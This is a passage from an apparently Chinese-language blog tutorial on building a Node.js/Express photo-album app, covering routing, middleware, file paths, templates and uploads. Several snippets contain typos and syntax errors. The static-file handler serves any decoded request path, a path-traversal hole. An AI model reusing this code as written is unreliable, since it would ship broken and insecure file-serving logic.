require('path');const config = require('./config');const formidable = require('formidable');exports.showIndex = (req, res, next) =&gt; &#123; // 1. 将所有的相册名称读取出来 // 2. 把相册名称数据和文件中的模板字符串编译替换 // 3. 发送给客户端浏览器 fs.readdir(config.uploadDir, (err, files) =&gt; &#123; if (err) &#123; // return next(err); &#125; res.render('index', &#123; albumNames: files &#125;); &#125;);&#125;;exports.doAddAlbum = (req, res, next) =&gt; &#123; const albumName = req.query.albumName ? req.query.albumName.trim() : ''; if (/(\\|\/|\:|\*|\?|"|\&lt;|\&gt;|\|)|^$/.test(albumName)) &#123; return res.end('albumName param invalid error.'); &#125; fs.access(path.join(config.uploadDir, albumName), err =&gt; &#123; if (!err) &#123; return res.end('albumName already exists'); &#125; fs.mkdir(path.join(config.uploadDir, albumName), err =&gt; &#123; if (err) &#123; return next(err); &#125; res.redirect('/'); &#125;); &#125;);&#125;;exports.showAlbum = (req, res, next) =&gt; &#123; const albumName = req.query.albumName ? req.query.albumName.trim() : ''; fs.access(path.join(config.uploadDir, albumName), err =&gt; &#123; if (err) &#123; return res.end('album not exists.'); &#125; fs.readdir(path.join(config.uploadDir, albumName), (err, files) =&gt; &#123; if (err) &#123; return next(err); &#125; res.render('album', &#123; albumName: albumName, albumPaths: files.map(fileName =&gt; `/uploads/$&#123;albumName&#125;/$&#123;fileName&#125;`) &#125;); &#125;); &#125;);&#125;;exports.doUpload = (req, res, next) =&gt; &#123; const albumName = req.query.albumName ? req.query.albumName : ''; fs.access(path.join(config.uploadDir, albumName), err =&gt; &#123; if (err) &#123; return res.end('album not exists'); &#125; const form = new formidable.IncomingForm(); form.uploadDir = path.join(config.uploadDir, albumName); form.keepExtensions = true; form.maxFieldsSize = 10 * 1024 * 1024; form.parse(req, (err, fields, files) =&gt; &#123; if (err) &#123; return res.end('The default size is 10MB.'); &#125; res.redirect(`/album?albumName=$&#123;albumName&#125;`); &#125;); &#125;);&#125;; 路由系统模块Express 中提供了一种路由模块化的方式，具体使用形式就是可以将路由单独的放到一个模块中，然后通过 app.use 的形式加载路由系统。 中间件如果把一个 http 处理过程比作是污水处理，中间件就像是一层层的过滤网（过滤器）。每个中间件在 http 处理过程中通过改写 request或（和）response 的数据、状态，实现了特定的功能。 简单说，中间件（middleware）就是处理HTTP请求的函数。它最大的特点就是，一个中间件处理完，再传递给下一个中间件。App 实例在运行过程中，会调用一系列的中间件。 中间件的功能包括： 执行任何代码。 修改请求和响应对象。 终结请求-响应循环。 调用堆栈中的下一个中间件。 中间件函数每个中间件可以从App实例，接收三个参数，依次为： request对象（代表HTTP请求） response对象（代表HTTP回应） next回调函数（代表下一个中间件） 每个中间件都可以对HTTP请求（request对象）进行加工，并且决定是否调用next方法，将request对象再传给下一个中间件。 123456function exampleMiddware(req, res, next) &#123; // handle req // or end res // or next() // or next(err)&#125; 中间件常用 API app.use(handler) 任何请求方法、路径都会进入该中间件，然后执行里面的代码 app.use([path], handler) 只有指定的请求路径，才会进入该中间件，然后执行里面的代码 app.get(path, handler) 只有 get 请求，并且是指定的请求路径，才会执行该中间件 app.post(path, handler) 只有 post 请求，并且是指定的请求路径，才会执行该中间件 常用第三方中间件Express middleware 使用第三方中间件的步骤一般如下： 第一步 npm install --save 中间件名称 第二步：看文档，找到 example，然后 try-try-see Express 中的错误处理这是从框架、代码层面的解决。 程序运行异常的解决。 如何记录错误日志 APIexpress() express() 类似于 http.createServer，得到一个 Server 实例对象 express.static(‘公共资源目录路径’) 处理静态资源 express.Router([options])：创建路由实例对象 得到一个 router 实例 给 router 挂载路由处理函数 get、post、 然后就可以通过 app.use 的形式加载这个 router 实例 Application app.locals res.download(path [, filename] [, fn]) res.end([data] [, encoding]) res.json([body]) res.jsonp([body]) res.redirect([status,] path) res.render(view [, locals] [, callback]) res.send([body]) res.sendFile(path [, options] [, fn]) res.sendStatus(statusCode) res.set(field [, value]) res.status(code) res.type(type) ‘Content-Type’ 12345678910111213141516171819const express = require('express');const app = express();// app.locals 是一个对象，可以给它挂载数据// 然后就可以在后续的任何处理函数中通过 req.app.locals 来使用了// 作用：可以把多个处理函数中使用到的公共的资源挂载给 app.locals 属性app.locals.name = 'hello';app.get('/', (req, res) =&gt; &#123; console.log(req.app.locals.name)&#125;);app.get('/download', (req, res) =&gt; &#123; res.download('./README.md');&#125;);app.get('/json', (req, res) =&gt; &#123; res.json(&#123; name: 'jack', foo: 'bar' &#125;);&#125;);app.listen(3000); Request router.all(path, [callback, …] callback) router.METHOD(path, [callback, …] callback) get post router.param([name,] callback) router.route(path) router.use([path], [function, …] function) 中间件插件 API 安装插件 加载插件 使用插件 API 关于中间件。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455// app.use(中间件处理函数)// app.use('请求路径', 请求处理函数)// app.get('请求路径', 请求处理函数)// app.post('请求路径', 请求处理函数)const express = require('express');const fs = require('fs');const path = require('path');const app = express();// 不限定于某个具体的 请求方法+请求路径app.use('/a',express.static(path.join(__dirname, 'data/a')));app.use('/b',express.static(path.join(__dirname, 'data/b')));// 该中间件，任何请求都会进入该中间件// 请求进入中间// 记录所有的请求日志app.use((req, res, next) =&gt; &#123; fs.appendFile('./log.txt', `$&#123;req.method&#125; - $&#123;req.url&#125; - $&#123;JSON.stringify(req.query)&#125;`, err =&gt; &#123; if (err) &#123; throw err; &#125; // 代码执行到这里，说明日志记录成功，该中间件任务已完成，可以进入下一个中间件了 next(); &#125;);&#125;);// 该中间件可以处理任意的 /a 请求// 无论是 get 请求 /a 还是 post 请求 /a 都会进入该中间件// 只要请求路径不是 /a 就不会进入该中间件app.use('/a', (req, res) =&gt; &#123; console.log('进入 /a 请求处理中间件了');&#125;);app.use((req, res, next) =&gt; &#123; console.log(222); next();&#125;);app.get('/', (req, res) =&gt; &#123; res.send('index page');&#125;);// 处理 HTTP 具体方法和路径型中间件// 一般在这里结束响应之后，就不需要调用下一个中间件了app.get('/login', (req, res, next) =&gt; &#123; res.send('login page'); next();&#125;);app.use((req, res, next) =&gt; &#123; // 一个请求对应一个响应 // 响应结束，该处理流程中就不能再次发送响应数据了，否则报错 // res.send('aaa'); console.log('responsed end...'); next();&#125;);app.get('/login', (req, res, next) =&gt; &#123; console.log('aaa login'); next();&#125;);app.listen(3000); express 支持使用字符串模式的路由路径req.pramers 来取得路径的参数 如路径 article/:5, 是一个对象，里面可以获取到当前路径的参数]]></content>
      <categories>
        <category>Node.js</category>
      </categories>
      <tags>
        <tag>Node.js</tag>
        <tag>Express</tag>
        <tag>小项目</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Node-相册小项目（中）]]></title>
    <url>%2F2017%2F02%2F18%2FNode-%E7%9B%B8%E5%86%8C%E5%B0%8F%E9%A1%B9%E7%9B%AE%EF%BC%88%E4%B8%AD%EF%BC%89%2F</url>
    <content type="text"><![CDATA[文件路径操作文件的路径使用注意事项： 如果是以 / 开头的路径，则就是去执行当前脚本所属的磁盘根路径去找 如果是以 C:/dev/nvm/settings.txt ，则直接去找该绝对路径 如果是以 ./ 或者 ../开头的，则是相对于执行 node 命令的时候所处的路径 1234567const fs = require('fs');fs.readFile('/README.md', 'utf8', (err, data) =&gt; &#123; if (err) &#123; throw err; &#125; console.log(data);&#125;); 如果使用 C:\Users\mhq\Desktop&gt; node code/02_文件路径.js 这样执行 node 命令： 该文件中的相对路径是去执行node命令的目录地方去找了 &#39;C:\Users\mhq\Desktop\README.md 又如：C:\Users\mhq&gt; node .\Desktop\code\02_文件路径.js 找了这样 C:\Users\mhq\README.md 的目录 想要解决上面的问题： 每一个模块中都提供了两个属性： __dirname 和 __filename 所以，如果是操作相对路径的文件，最好把相对路径转为绝对路径。 但是绝对路径又不能写死，可以使用每一个文件模块中都提供了两个属性：__dirname 和 __filename 。 __dirname 用来获取当前文件模块所属目录的绝对路径 __filename 用来获取当前文件的绝对路径，这个属性用的比较少 然后在执行 node 命令，不会受路径影响。 __dirname 相对于当前所在文件，找到它的绝对路径，假如下面这段代码在 02.js 这个文件中，那么 __dirname 就是找的 02.js 的绝对路径。而这个 README.md文件是和 02.js 同级，如果 02.js 在 README.md 的上一级，那么只需要加上 ../ 就可以自动拼接了。 1234567891011121314151617const fs = require('fs');const path = require('path');fs.readFile(path.join(__dirname, 'README.md'), 'utf8', (err, data) =&gt; &#123; if (err) &#123; throw err; &#125; console.log(data);&#125;);fs.readFile(path.join(__dirname, 'README.md'), 'utf8', (err, data) =&gt; &#123; if (err) &#123; throw err; &#125; console.log(data);&#125;);console.log(__dirname); // =&gt; C:\Users\mhq\Desktop\codeconsole.log(__filename); // =&gt; C:\Users\mhq\Desktop\code\02_文件路径.jsconsole.log(path.join(__dirname, 'README.md')); // 把相对路径变为绝对路径 注意：加载自己写的相对路径模块不受执行 node 命令所处目录影响，也就是说，加载文件模块还是使用相对路径 node 中使用模板引擎app.js 12345678910const http = require('http');const router = require('./router');http .createServer() .on('request', (req, res) =&gt; &#123; router(req, res); &#125;) .listen(3000, () =&gt; &#123; console.log('Server is running at port 3000.'); &#125;); router.js 1234567891011121314const path = require('path');const url = require('url');const handler = require('./handler');module.exports = funciton(req, res) &#123; const urlObj = url.parse(req.url, true); const pathname = urlObj.pathname; const queryObj = urlObj.query; // 一个请求对应了一个处理流程代码 if (pathname === '/') &#123; handler.showIndex(req, res); &#125; else if (pathname.startsWith('/public/') || pathname.startsWith('/uploads/') || pathname.startsWith('/node_modules/')) &#123; handler.showPublic(req, res); &#125;&#125; hander.js 123456789101112131415161718192021222324252627282930313233343536373839const fs = require('fs');const _ = require('underscore');const url = require('mine')// 处理渲染首页exports.showIndex = (req, res) =&gt; &#123; fs.readdir('./uploads', (err, files) =&gt; &#123; if (err) &#123; throw err; &#125; fs.readFile('./views/index.html', 'utf8', (err, data) =&gt; &#123; if (err) &#123; throw err; &#125; const result = _.template(data)( albumNames: files ); res.writeHead(200, &#123; 'Content-Type': 'text/html; charset=utf-8' &#125;); res.end(result); &#125;); &#125;);&#125;;// 处理添加相册// 处理渲染相册页面// 处理上传照片请求// 处理静态资源请求exports.showPublic = (req, res) =&gt; &#123; fs.readFile(`.$&#123;req.url&#125;`, (err, data) =&gt; &#123; if (err) &#123; res.writeHead(404, 'Not Found'); res.end(); &#125; res.writeHead(200, &#123; 'Content-Type': mime.lookup(req.url) &#125;) res.end(data); &#125;);&#125;; ./views/index.html 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576&lt;!doctype html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;我的相册&lt;/title&gt; &lt;meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0"&gt; &lt;link rel="stylesheet" href="node_modules/bootstrap/dist/css/bootstrap.css"&gt; &lt;link rel="stylesheet" href="public/css/main.css"&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="container-fluid"&gt; &lt;nav class="navbar navbar-default"&gt; &lt;div class="container-fluid"&gt; &lt;div class="navbar-header"&gt; &lt;button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1" aria-expanded="false"&gt; &lt;span class="sr-only"&gt;Toggle navigation&lt;/span&gt; &lt;span class="icon-bar"&gt;&lt;/span&gt; &lt;span class="icon-bar"&gt;&lt;/span&gt; &lt;span class="icon-bar"&gt;&lt;/span&gt; &lt;/button&gt; &lt;a class="navbar-brand" href="/"&gt;我的相册&lt;/a&gt; &lt;/div&gt; &lt;div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1"&gt; &lt;ul class="nav navbar-nav"&gt; &lt;li class="active"&gt;&lt;a href="/"&gt;首页 &lt;span class="sr-only"&gt;(current)&lt;/span&gt;&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;ul class="nav navbar-nav navbar-right"&gt; &lt;li&gt; &lt;a href="" data-toggle="modal" data-target="#exampleModal" data-whatever="@mdo"&gt;新建相册&lt;/a&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/div&gt; &lt;/nav&gt; &lt;/div&gt; &lt;div class="container"&gt; &lt;!-- 使用模板引擎 --&gt; &lt;div class="row"&gt; &lt;% albumNames.forEach(function(albumName)&#123; %&gt; &lt;div class="col-xs-6 col-md-3"&gt; &lt;a href="#" class="thumbnail"&gt; &lt;img src="public/img/icon.png" alt=""&gt; &lt;/a&gt; &lt;div class="caption"&gt; &lt;h3&gt;&lt;%= albumName %&gt;&lt;/h3&gt; &lt;/div&gt; &lt;/div&gt; &lt;% &#125;) %&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="modal fade" id="exampleModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel"&gt; &lt;div class="modal-dialog" role="document"&gt; &lt;div class="modal-content"&gt; &lt;form action="/" method="post"&gt; &lt;div class="modal-header"&gt; &lt;button type="button" class="close" data-dismiss="modal" aria-label="Close"&gt;&lt;span aria-hidden="true"&gt;&amp;times;&lt;/span&gt;&lt;/button&gt; &lt;h4 class="modal-title" id="exampleModalLabel"&gt;新建相册&lt;/h4&gt; &lt;/div&gt; &lt;div class="modal-body"&gt; &lt;div class="form-group"&gt; &lt;label for="recipient-name" class="control-label"&gt;相册名称:&lt;/label&gt; &lt;input type="text" class="form-control" name="albumName" placeholder="请输入相册名称"&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="modal-footer"&gt; &lt;button type="button" class="btn btn-default" data-dismiss="modal"&gt;关闭&lt;/button&gt; &lt;button type="submit" class="btn btn-success"&gt;点击添加&lt;/button&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;script src="node_modules/jquery/dist/jquery.js"&gt;&lt;/script&gt; &lt;script src="node_modules/bootstrap/dist/js/bootstrap.js"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 现在的问题是要使项目运行起来，不知道项目的入口文件。 如何解决？ 利用某种规则。可以写一些 npm 运行脚本。如：package.json 中的 &quot;script&quot; 。 在 “script” 下加 &quot;start&quot;: &quot;node app.js&quot; 。 现在启动网站直接可以使用 npm start 直接启动项目。其中start 是在终端中要执行的命令名称。 package.json 1234567891011121314151617181920&#123; "name": "album", "version": "1.0.0", "description": "", "main": "index.js", "scripts": &#123; "test": "echo \"Error: no test specified\" &amp;&amp; exit 1", "start": "node app.js" &#125;, "keywords": [], "author": "lpz &lt;mail@lipengzhou.com&gt; (http://www.lipengzhou.com/)", "license": "MIT", "dependencies": &#123; "bootstrap": "^3.3.7", "formidable": "^1.0.17", "jquery": "^3.1.1", "mime": "^1.3.4", "underscore": "^1.8.3" &#125;&#125; 使用模板引擎在浏览器中使用模板引擎12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;在浏览器中使用模板引擎&lt;/title&gt; &lt;link rel="stylesheet" href="../node_modules/bootstrap/dist/css/bootstrap.css"&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="container"&gt; &lt;div class="row"&gt; &lt;div class="col-xs-6 col-md-3"&gt; &lt;a href="#" class="thumbnail"&gt; &lt;img src="../public/img/icon.png" alt=""&gt; &lt;/a&gt; &lt;div class="caption"&gt; &lt;h3&gt;相册名称&lt;/h3&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="col-xs-6 col-md-3"&gt; &lt;a href="#" class="thumbnail"&gt; &lt;img src="../public/img/icon.png" alt=""&gt; &lt;/a&gt; &lt;div class="caption"&gt; &lt;h3&gt;相册名称&lt;/h3&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;script type="text/template" id="tpl"&gt; &lt;% arr.forEach(function (item) &#123; %&gt; &lt;div class="col-xs-6 col-md-3"&gt; &lt;a href="#" class="thumbnail"&gt; &lt;img src="../public/img/icon.png" alt=""&gt; &lt;/a&gt; &lt;div class="caption"&gt; &lt;h3&gt;&lt;%= item %&gt;&lt;/h3&gt; &lt;/div&gt; &lt;/div&gt; &lt;% &#125;) %&gt; &lt;/script&gt; &lt;script src="../node_modules/underscore/underscore.js"&gt;&lt;/script&gt; &lt;script&gt; var arr = ['人文', '地理', '美女']; var result = _.template(document.getElementById('tpl').innerHTML)(&#123; arr: arr; &#125;); console.log(result); // 1. 模板引擎和 DOM 操作没有任何关系 // 2. 模板引擎并不一定操作 HTML 结构字符串 &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 在 node 中使用模板引擎在 node 中，模板引擎的使用方式和浏览器是一样的。 只不过模板字符串的存储方式变了，因为 node 中没有DOM，没有 script 标签的概念。 但是 node 支持文件操作，所以我们把模板字符串放到文件中。 使用的时候，通过 fs.readFile 读取出来就可以了。 .js 文件 12345678910111213const _ = require('underscore');const fs = require('fs');fs.readFile('./tpl.mhq', 'utf8', (err, data) =&gt; &#123; if (err) &#123; throw err; &#125; var arr = ['人文', '地理', '美女']; // 键名和引用名一样，只用一个就可以表示。 const result = _.template(data)(&#123; arr; &#125;); console.log(result);&#125;); tpl.mhq 12345678910&lt;% arr.forEach(function (item) &#123; %&gt;&lt;div class="col-xs-6 col-md-3"&gt; &lt;a href="#" class="thumbnail"&gt; &lt;img src="../public/img/icon.png" alt=""&gt; &lt;/a&gt; &lt;div class="caption"&gt; &lt;h3&gt;&lt;%= item %&gt;&lt;/h3&gt; &lt;/div&gt;&lt;/div&gt;&lt;% &#125;) %&gt; 使用模板引擎处理别的字符串.js 文件 123456789101112const fs = require('fs');const _ = require('underscore');const users = require('./data.json'); fs.readFile('./result.txt', 'utf8', (err, data) =&gt; &#123; if (err) &#123; throw err; &#125; const result = _.template(data)(&#123; users; &#125;); console.log(result);&#125;); data.json 123456789101112131415161718192021222324[ &#123; "name": "jack", "age": 18, "gender": "男", "birthday": "1995-11-11", "hobby": [ "eat", "sleep", "hitDouDou" ] &#125;, &#123; "name": "rose", "age": 18, "gender": "女", "birthday": "1995-11-11", "hobby": [ "eat", "sleep", "hitDouDou" ] &#125;] result.txt 123456789&lt;% users.forEach(function (user) &#123; %&gt;姓名：&lt;%= user.name %&gt;年龄：&lt;%= user.age %&gt;性别：&lt;%= user.gender %&gt;生日：&lt;%= user.birthday %&gt;爱好：&lt;%= user.hobby.join(&apos;、&apos;) %&gt;----------------------------------------------------------------------&lt;% &#125;) %&gt; 处理添加相册GET /album/add?albumName=xxx&amp;key=xxx 表单 GET 提交（表单的 method 属性默认就是 get）： 表单会将表单中所有具有 name 属性的 input 按照: name=input-value&amp;name1=input-value2&amp;xxx=xxx, 拼接完之后，找到自己的 action（就是请求路径）, 然后在 action 之后 加一个 ? ，后面跟上拼接好的查询字符串 最后，发起请求 albumName=xxx&amp;xxx=xxx /album/add?albumName=xxx&amp;xxx=xxx appjs 12345678910const http = require('http')const router = require('./router')http .createServer() .on('request', (req, res) =&gt; &#123; router(req, res) &#125;) .listen(3000, () =&gt; &#123; console.log('Server is running at port 3000.') &#125;) index.html 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576&lt;!doctype html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;我的相册&lt;/title&gt; &lt;meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0"&gt; &lt;link rel="stylesheet" href="node_modules/bootstrap/dist/css/bootstrap.css"&gt; &lt;link rel="stylesheet" href="public/css/main.css"&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="container-fluid"&gt; &lt;nav class="navbar navbar-default"&gt; &lt;div class="container-fluid"&gt; &lt;div class="navbar-header"&gt; &lt;button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1" aria-expanded="false"&gt; &lt;span class="sr-only"&gt;Toggle navigation&lt;/span&gt; &lt;span class="icon-bar"&gt;&lt;/span&gt; &lt;span class="icon-bar"&gt;&lt;/span&gt; &lt;span class="icon-bar"&gt;&lt;/span&gt; &lt;/button&gt; &lt;a class="navbar-brand" href="/"&gt;我的相册&lt;/a&gt; &lt;/div&gt; &lt;div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1"&gt; &lt;ul class="nav navbar-nav"&gt; &lt;li class="active"&gt;&lt;a href="/"&gt;首页 &lt;span class="sr-only"&gt;(current)&lt;/span&gt;&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;ul class="nav navbar-nav navbar-right"&gt; &lt;li&gt; &lt;a href="" data-toggle="modal" data-target="#exampleModal" data-whatever="@mdo"&gt;新建相册&lt;/a&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/div&gt; &lt;/nav&gt; &lt;/div&gt; &lt;div class="container"&gt; &lt;div class="row"&gt; &lt;% albumNames.forEach(function(albumName)&#123; %&gt; &lt;div class="col-xs-6 col-md-3"&gt; &lt;!-- 这里处理了 a 连接 --&gt; &lt;a href="/album?albumName=&lt;%= albumName %&gt;" class="thumbnail"&gt; &lt;img src="public/img/icon.png" alt=""&gt; &lt;/a&gt; &lt;div class="caption"&gt; &lt;h3&gt;&lt;%= albumName %&gt;&lt;/h3&gt; &lt;/div&gt; &lt;/div&gt; &lt;% &#125;) %&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="modal fade" id="exampleModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel"&gt; &lt;div class="modal-dialog" role="document"&gt; &lt;div class="modal-content"&gt; &lt;form action="/album/add" method="get"&gt; &lt;div class="modal-header"&gt; &lt;button type="button" class="close" data-dismiss="modal" aria-label="Close"&gt;&lt;span aria-hidden="true"&gt;&amp;times;&lt;/span&gt;&lt;/button&gt; &lt;h4 class="modal-title" id="exampleModalLabel"&gt;新建相册&lt;/h4&gt; &lt;/div&gt; &lt;div class="modal-body"&gt; &lt;div class="form-group"&gt; &lt;label for="recipient-name" class="control-label"&gt;相册名称:&lt;/label&gt; &lt;input type="text" class="form-control" name="albumName" placeholder="请输入相册名称"&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="modal-footer"&gt; &lt;button type="button" class="btn btn-default" data-dismiss="modal"&gt;关闭&lt;/button&gt; &lt;button type="submit" class="btn btn-success"&gt;点击添加&lt;/button&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;script src="node_modules/jquery/dist/jquery.js"&gt;&lt;/script&gt; &lt;script src="node_modules/bootstrap/dist/js/bootstrap.js"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; album.html 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869&lt;!doctype html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;我的相册 -&lt;/title&gt; &lt;link rel="stylesheet" href="node_modules/bootstrap/dist/css/bootstrap.css"&gt; &lt;link rel="stylesheet" href="public/css/main.css"&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="container-fluid"&gt; &lt;nav class="navbar navbar-default"&gt; &lt;div class="container-fluid"&gt; &lt;div class="navbar-header"&gt; &lt;button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1" aria-expanded="false"&gt; &lt;span class="sr-only"&gt;Toggle navigation&lt;/span&gt; &lt;span class="icon-bar"&gt;&lt;/span&gt; &lt;span class="icon-bar"&gt;&lt;/span&gt; &lt;span class="icon-bar"&gt;&lt;/span&gt; &lt;/button&gt; &lt;a class="navbar-brand" href="/"&gt;我的相册&lt;/a&gt; &lt;/div&gt; &lt;div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1"&gt; &lt;ul class="nav navbar-nav"&gt; &lt;li class="active"&gt;&lt;a href="/"&gt;首页 &lt;span class="sr-only"&gt;(current)&lt;/span&gt;&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;ul class="nav navbar-nav navbar-right"&gt; &lt;li&gt;&lt;a href="" data-toggle="modal" data-target="#exampleModal" data-whatever="@mdo"&gt;照片上传&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/div&gt; &lt;/nav&gt; &lt;/div&gt; &lt;div class="container"&gt; &lt;div class="row"&gt; &lt;% albumPaths.forEach(function (imgSrc) &#123; %&gt; &lt;div class="col-xs-6 col-md-3"&gt; &lt;div class="thumbnail"&gt; &lt;img src="&lt;%= imgSrc %&gt;" alt=""&gt; &lt;/div&gt; &lt;/div&gt; &lt;% &#125;) %&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="modal fade" id="exampleModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel"&gt; &lt;div class="modal-dialog" role="document"&gt; &lt;div class="modal-content"&gt; &lt;form action="/upload?albumName=&lt;%= albumName %&gt;" method="post" enctype="multipart/form-data"&gt; &lt;div class="modal-header"&gt; &lt;button type="button" class="close" data-dismiss="modal" aria-label="Close"&gt;&lt;span aria-hidden="true"&gt;&amp;times;&lt;/span&gt;&lt;/button&gt; &lt;h4 class="modal-title" id="exampleModalLabel"&gt;照片上传&lt;/h4&gt; &lt;/div&gt; &lt;div class="modal-body"&gt; &lt;div class="form-group"&gt; &lt;label for="recipient-name" class="control-label"&gt;请选择文件:&lt;/label&gt; &lt;input type="file" class="form-control" name="pic"&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="modal-footer"&gt; &lt;button type="button" class="btn btn-default" data-dismiss="modal"&gt;关闭&lt;/button&gt; &lt;button type="submit" class="btn btn-success"&gt;点击上传&lt;/button&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;script src="node_modules/jquery/dist/jquery.js"&gt;&lt;/script&gt; &lt;script src="node_modules/bootstrap/dist/js/bootstrap.js"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; router.js12345678910111213141516171819202122232425262728293031323334353637383940414243const path = require('path');const url = require('url');const handler = require('./handler');module.exports = function (req, res) &#123; // 指定第二个参数，parse 方法会将查询字符串解析为一个对象挂载给返回结果的 query 属性 // 该方法，会将一个完整的 url 路径解析为一个对象，方便我们取各个部分的数据 const urlObj = url.parse(req.url, true); // 拿到请求路径，不包含查询字符串 const pathname = urlObj.pathname; // 拿到通过 url.parse 方法解析出来的查询字符串（已经自动转为对象了） const queryObj = urlObj.query; // 拿到当前请求方法 const method = req.method.toLowerCase(); // 在这里，将解析到的查询字符串以属性的形式挂载给 req 请求对象 // 在后面的处理方法中就可以直接通过 req.query 来获取查询字符串中的数据了 req.query = queryObj || &#123;&#125;; // 302 重定向 // 浏览器收到 302 状态码的时，浏览器会自动找响应报文中的 Location，然后对 Location 指向的地址发起请求 // 在这里给 res 对象挂载一个 redirect 方法，在后续的处理中就可以直接使用该方法，就可以实现重定向跳转 res.redirect = url =&gt; &#123; res.writeHead(302, &#123; 'Location': url; &#125;) res.end(); &#125; // 一个请求其实就是对应一个处理函数，每一个请求处理函数无非都需要用到 req 对象和 res 对象 // 所以 handler 中都定义成接收 req 和 res 的一个一个的小函数，用来处理对应的请求 if (pathname === '/') &#123; handler.showIndex(req, res); &#125; else if (method === 'get' &amp;&amp; (pathname.startsWith('/public/') || pathname.startsWith('/uploads/') || pathname.startsWith('/node_modules/'))) &#123; handler.showPublic(req, res); &#125; else if (method === 'get' &amp;&amp; pathname === '/album/add') &#123; handler.doAddAlbum(req, res); &#125; else if (method === 'get' &amp;&amp; pathname === '/album') &#123; handler.showAlbum(req, res); &#125; else if (method === 'post' &amp;&amp; pathname === '/upload') &#123; handler.doUpload(req, res); &#125; else if (method === 'get' &amp;&amp; pathname === '/register') &#123; handler.showRegister(req, res); &#125; else if (method === 'post' &amp;&amp; pathname === '/register') &#123; handler.doRegister(req, res); &#125;&#125; handler.js 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188const fs = require('fs');const path = require('path');const _ = require('underscore');const mime = require('mime');const config = require('./config');const qstring = require('querystring');const formidable = require('formidable');exports.showIndex = (req, res) =&gt; &#123; // 1. 将所有的相册名称读取出来 // 2. 把相册名称数据和文件中的模板字符串编译替换 // 3. 发送给客户端浏览器 fs.readdir(config.uploadDir, (err, files) =&gt; &#123; if (err) &#123; throw err; &#125; fs.readFile('./views/index.html', 'utf8', (err, data) =&gt; &#123; if (err) &#123; throw err; &#125; // 使用 underscore 中的 template 模板引擎在后台处理一下源数据 // 这里是把 index.html 文件内容当成模板字符串了（整体） // 也就是说你在 index.html 页面可以随便使用模板引擎语法，因为后台在发送页面内容之前会对文件内容做处理 const result = _.template(data)(&#123; albumNames: files &#125;); res.writeHead(200, &#123; 'Content-Type': 'text/html; charset=utf-8' &#125;); res.end(result); &#125;); &#125;);&#125;;/** * GET /public * /uploads * /node_modules * 这是一个处理公共资源的请求处理方法 */exports.showPublic = (req, res) =&gt; &#123; // 解决中文路径解析问题 const url = decodeURI(req.url); fs.readFile(`.$&#123;url&#125;`, (err, data) =&gt; &#123; if (err) &#123; res.writeHead(404, 'Not Found'); res.end(); &#125; res.writeHead(200, &#123; 'Content-Type': mime.lookup(req.url); &#125;) res.end(data); &#125;);&#125;;/** * GET /album/add * query: &#123; albumName: 'xxx' &#125; */exports.doAddAlbum = (req, res) =&gt; &#123; // 1. 接收客户端的请求数据 // 2. 处理请求：创建目录 // 3. 发送响应：告诉请求端，成功与否 const albumName = req.query.albumName ? 